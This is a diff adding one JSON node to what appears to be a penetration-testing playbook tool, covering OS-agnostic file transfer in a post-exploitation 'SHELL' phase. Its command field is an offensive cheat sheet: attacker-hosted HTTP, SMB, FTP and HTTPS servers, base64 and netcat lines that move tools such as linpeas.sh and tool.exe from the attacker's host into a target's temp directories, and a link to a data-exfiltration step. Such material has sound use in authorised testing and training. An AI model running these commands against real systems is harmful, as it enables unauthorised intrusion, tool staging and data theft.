@@ -1,0 +1,22 @@
+{
+  "id": "transfer_agnostic",
+  "phase": "SHELL",
+  "title": "File Transfer — Agnostic (Any OS)",
+  "body": "Methods that work regardless of OS. Start here if you don't know what's available on the target.",
+  "cmd": "# ── ATTACKER SIDE — SERVE FILES ──────────────────────\n# Python HTTP server (fastest, most reliable)\npython3 -m http.server 80\npython3 -m http.server 8080   # if 80 blocked\npython3 -m http.server 443    # if filtered by port\n\n# impacket SMB share (best for Windows targets)\nimpacket-smbserver -smb2support share .\nimpacket-smbserver -smb2support share /path/to/tools -username user -password pass\n\n# FTP server\npython3 -m pyftpdlib -p 21 -w\n\n# HTTPS server (self-signed)\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/CN=localhost\"\npython3 -c \"import ssl,http.server; ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain('cert.pem','key.pem'); httpd=http.server.HTTPServer(('',443),http.server.SimpleHTTPRequestHandler); httpd.socket=ctx.wrap_socket(httpd.socket); httpd.serve_forever()\"\n\n# ── BASE64 TRANSFER (no network tools needed) ─────────\n# Attacker — encode file\nbase64 -w0 linpeas.sh && echo\ncat linpeas.sh | base64 -w0\n\n# Target — paste and decode\necho \"BASE64STRING\" | base64 -d > /tmp/linpeas.sh\necho \"BASE64STRING\" | base64 -d > C:\\Windows\\Temp\\tool.exe\n\n# ── NC TRANSFER (no HTTP available) ──────────────────\n# Attacker — send file\nnc -nlvp 4444 < tool.exe\n\n# Target — receive file\nnc $lhost 4444 > /tmp/tool\nnc.exe $lhost 4444 > C:\\Windows\\Temp\\tool.exe\n\n# ── VERIFY INTEGRITY ──────────────────────────────────\n# Linux\nmd5sum /tmp/tool\nsha256sum /tmp/tool\n# Windows\ncertutil -hashfile C:\\Windows\\Temp\\tool.exe MD5\nGet-FileHash C:\\Windows\\Temp\\tool.exe -Algorithm MD5",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Windows target",
+      "next": "transfer_windows"
+    },
+    {
+      "label": "Linux target",
+      "next": "transfer_linux"
+    },
+    {
+      "label": "Exfiltrate data out",
+      "next": "transfer_exfil"
+    }
+  ]
+}
